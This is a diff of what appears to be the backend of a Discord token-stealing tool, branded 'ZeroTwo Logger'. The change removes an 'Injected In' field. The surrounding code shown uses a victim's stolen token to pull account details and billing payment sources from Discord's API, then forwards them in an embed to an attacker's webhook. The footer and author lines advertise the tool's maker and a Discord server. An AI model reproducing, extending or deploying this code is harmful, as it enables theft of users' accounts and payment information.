@@ -540,11 +540,6 @@ app.post("/inject", (req, res) => {
 })
 app.get("/beforeinject", (req, res) => {
     req = JSON.parse(req.body)
-    var realInjected = ""
-    if (req.injected) {
-        req.injected = req.injected.split("::") 
-        req.injected.forEach(r => realInjected += `${r}\n`)
-    }
     var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
     if (basicInfos == "Invalid") return
     var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
@@ -593,7 +588,6 @@ app.get("/beforeinject", (req, res) => {
         .setImage(image)
         .setColor("#00aaaa")
         .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
-    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + realInjected + "```")
     webhook.send(embed)
     var friendEmbed = new Discord.RichEmbed()
         .setAuthor(`By ٴ!"𝐍𝐨𝐭.𝐅𝐮𝐛𝐮𝐤𝐢𝐢 †ٴٴ#6900`, "http://image.noelshack.com/fichiers/2021/49/6/1639241258-22023458-bb44-4943-97e9-20bbbed8cd10.gif", "https://discord.gg/VJTmKz4yPX")
